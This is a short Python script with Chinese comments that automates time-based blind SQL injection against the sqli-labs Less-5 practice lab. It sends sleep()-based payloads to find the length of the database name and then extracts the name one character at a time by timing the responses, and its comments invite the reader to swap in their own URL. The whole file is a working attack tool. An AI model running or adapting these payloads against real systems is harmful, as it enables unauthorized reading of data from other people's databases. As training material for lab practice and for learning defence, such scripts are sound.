import requests                                  #最关键的requests库，可以好好了解一下
import time                                       #这个也是必要的
chars='，abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'#爆破
database=''                                                #把结果加到这个变量里
global length                                                
 
for l in range(1,20):                       #这里有时候range 要大些，因为用了group_concat把结果都放在一行了，可能使长度很大
    url ='http:#192.168.1.100/sqli-labs-master/Less-5/' #url自己根据情况改
    close="?id=1'"                                       #闭合方式
    payload1=' and if(length(database())=%s,sleep(2),0) --+' %l       #最关键的地方，和其他注入方法的payload 差不多，只是用了延时的手法
    start_time=time.time()
    r=requests.get(url+close+payload1)
    end_time=time.time()
    sec=end_time-start_time                #算出get请求和sleep后所用的时间
    if  sec >=2:                           #时间符号条件就print并退出
        print('database length is '+str(l))
        # global length
        length =l
        break
    else:
        pass
for i in range (1,length+1):
    for char in chars:
        payload2="and if(substr(database(),%d,1)='%s',sleep(2),1) --+" %(i,char)#substr取每位爆破
        start_time2=time.time()
        r2=requests.get(url+close+payload2)
        end_time2=time.time()
        sec2=(end_time2-start_time2)#也是一样，符合条件就输出
        if sec2 >=2:
            database+=char
            print(database)
            break
print('database_name:',database)